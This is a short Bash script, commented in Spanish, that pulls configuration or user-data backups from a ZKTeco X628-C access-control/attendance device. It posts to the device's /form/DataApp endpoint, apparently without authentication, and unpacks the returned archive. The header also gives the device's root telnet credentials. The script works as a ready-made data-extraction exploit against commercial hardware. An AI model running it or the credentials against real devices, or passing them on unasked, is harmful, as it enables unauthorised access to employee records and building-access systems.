#!/bin/bash

###
# Descarga la configuracion y los datos del ZKTeco X628-C
#
# Device: http://www.zkteco.com/product/X628-C_225.html
# telnet root:solokey

function uso() {
    echo "Uso: $0 <data|config> <IP> [PORT]";
    exit;
}

if [ $# -lt 2 ]; then
    uso;
fi

backup=$1;
if [ "$backup" == "data" ]; then
    backup=2;
elif [ "$backup" == "config" ]; then
    backup=1;
else
    uso;
fi

host=$2;

port=80;
if [ $# -gt 2 ]; then
    port=$3;
fi

# descargar backup
echo -e "\e[32m[+] Descargando backup...\e[0m";
curl --data "style=$backup" "http://$host:$port/form/DataApp" -o /tmp/backup.dat &>/dev/null;

# extraer datos
echo -e "\e[32m[+] Extrayendo datos...\e[0m";
dd if=/tmp/backup.dat bs=1 skip=3104 of=/tmp/backup.tar &>/dev/null;
tar xf /tmp/backup.tar &>/dev/null;

# limpiar
rm -f /tmp/backup.dat /tmp/backup.tar;

echo -e "\e[32m[+] Terminado!\e[0m";

